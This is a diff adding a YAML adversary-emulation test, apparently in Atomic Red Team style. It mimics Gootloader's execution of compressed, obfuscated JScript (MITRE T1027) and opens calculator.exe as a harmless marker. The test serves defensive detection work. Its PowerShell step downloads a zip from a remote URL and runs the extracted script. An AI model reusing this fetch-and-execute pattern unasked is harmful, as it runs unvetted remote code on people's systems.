@@ -1,0 +1,35 @@
+api_version: "2.0"
+name: Execution from Compressed JScript File
+description: |
+    Mimic execution of compressed JavaScript file. When successfully executed, calculator.exe will open. This test is meant to help emulate Gootloader as per https://redcanary.com/blog/gootloader/
+args:
+    - name: url_path
+      type: string
+      default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/t1027js.zip
+uuid: fad04df1-5229-4185-b016-fb6010cd87ac
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1027: Obfuscated Files or Information'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        T1027.js must exist on disk at PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\T1027js.js
+      inline: |
+        if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\T1027js.js") {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        Invoke-WebRequest "#{url_path}" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\T1027js.zip"
+        Expand-Archive -path "PathToAtomicsFolder\..\ExternalPayloads\T1027js.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\" -Force
+        }}
+      executor: powershell
+    - name: execution-from-compressed-jscript-file
+      inline: |
+        "PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\T1027js.js"
+      executor: command_prompt
+      cleanup:
+        inline: |
+            taskkill /f /im calculator.exe >nul 2>nul
+        executor: command_prompt
